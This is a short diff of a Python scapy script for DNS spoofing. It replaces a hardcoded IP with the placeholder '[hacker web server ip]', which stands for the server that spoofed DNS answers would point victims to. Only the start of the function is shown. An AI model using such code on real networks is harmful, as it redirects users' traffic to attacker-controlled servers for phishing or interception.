@@ -1,7 +1,7 @@
 from scapy.all import *
 
 def dnsSpoof(packet):
-    spoofDNS = '3.39.157.82'
+    spoofDNS = '[hacker web server ip]'
     dstip = packet[IP].src
     #print("dst ip = {} (packet[IP].src)".format(dstip))
     srcip = packet[IP].dst
